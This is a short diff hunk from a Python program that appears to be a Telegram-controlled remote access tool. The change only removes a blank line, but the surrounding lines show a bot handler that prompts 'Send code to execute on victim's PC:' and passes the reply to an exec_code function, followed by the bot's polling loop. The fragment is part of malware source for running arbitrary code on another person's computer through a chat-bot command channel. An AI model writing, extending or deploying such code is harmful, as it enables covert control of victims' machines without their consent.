@@ -79,7 +79,6 @@ def start_tg_ruler():
         msg = bot.send_message(message.chat.id, "Send code to execute on victim's PC:")
         bot.register_next_step_handler(msg, exec_code)
 
-
     bot.polling(none_stop=True)
 
 def main():
